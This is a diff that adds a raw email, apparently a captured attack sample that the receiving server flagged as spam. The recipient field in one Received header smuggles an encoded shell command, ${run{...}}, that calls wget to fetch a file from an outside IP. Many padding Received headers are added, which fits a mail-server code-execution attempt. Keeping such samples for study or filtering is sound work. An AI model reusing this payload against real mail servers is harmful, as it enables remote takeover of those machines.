@@ -1,0 +1,57 @@
+Return-Path: <support@service.com>
+Delivered-To: mail@stilfilm.com
+Received: from localhost (localhost [127.0.0.1])
+	by v22014122474822114.stilfilm.com (Postfix) with ESMTP id D2B42D1AEA
+	for <mail@stilfilm.com>; Wed, 19 Jun 2019 15:36:41 +0200 (CEST)
+X-Quarantine-ID: <PaIn5QJ0LCYN>
+X-Virus-Scanned: Debian amavisd-new at v22014122474822114.yourvserver.net
+X-Amavis-Alert: BAD HEADER SECTION, Missing required header field: "Date"
+X-Spam-Flag: YES
+X-Spam-Score: 12.894
+X-Spam-Level: ************
+X-Spam-Status: Yes, score=12.894 required=5.5 tests=[BAYES_99=3.5,
+	EMPTY_MESSAGE=2.32, MISSING_DATE=1.36, MISSING_FROM=1,
+	MISSING_HEADERS=1.021, MISSING_MID=0.497, MISSING_SUBJECT=1.799,
+	SPF_HELO_SOFTFAIL=0.732, SPF_SOFTFAIL=0.665] autolearn=no
+Received: from v22014122474822114.stilfilm.com ([127.0.0.1])
+	by localhost (v22014122474822114.stilfilm.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id PaIn5QJ0LCYN for <mail@stilfilm.com>;
+	Wed, 19 Jun 2019 15:36:38 +0200 (CEST)
+Received: from service.com (mail.patentvendordatabase.com [96.95.14.70])
+	by v22014122474822114.stilfilm.com (Postfix) with SMTP id B7DDFD1AE2
+	for <root+${run{x2Fbinx2Fsht-ctx22wgetx2064.50.180.45x2ftmpx2f37.120.171.113x22}}@stilfilm.com>; Wed, 19 Jun 2019 15:36:35 +0200 (CEST)
+Received: 1
+Received: 2
+Received: 3
+Received: 4
+Received: 5
+Received: 6
+Received: 7
+Received: 8
+Received: 9
+Received: 10
+Received: 11
+Received: 12
+Received: 13
+Received: 14
+Received: 15
+Received: 16
+Received: 17
+Received: 18
+Received: 19
+Received: 20
+Received: 21
+Received: 22
+Received: 23
+Received: 24
+Received: 25
+Received: 26
+Received: 27
+Received: 28
+Received: 29
+Received: 30
+Received: 31
+Message-Id: <20190619133641.D2B42D1AEA@v22014122474822114.stilfilm.com>
+Date: Wed, 19 Jun 2019 15:36:41 +0200 (CEST)
+From: support@service.com
+
